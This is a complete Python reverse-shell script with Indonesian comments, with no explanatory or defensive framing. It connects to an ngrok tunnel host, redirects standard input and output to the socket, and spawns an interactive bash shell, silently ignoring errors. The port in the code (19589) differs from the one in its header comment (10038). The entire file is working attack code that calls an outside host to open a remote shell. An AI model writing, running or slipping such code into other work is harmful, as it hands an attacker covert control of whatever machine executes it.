import socket
import os
import pty

# Konfigurasi Ngrok
# Host: 0.tcp.ap.ngrok.io
# Port: 10038

def reverse_shell():
    attacker_host = "0.tcp.ap.ngrok.io"
    attacker_port = 19589

    try:
        # Membuat socket TCP
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Koneksi ke tunnel Ngrok
        s.connect((attacker_host, attacker_port))
        
        # Duplikasi file descriptor untuk stdin, stdout, dan stderr
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Menjalankan shell interaktif
        # pty.spawn memberikan shell yang lebih stabil daripada os.system
        pty.spawn("/bin/bash")
    except Exception as e:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    reverse_shell()
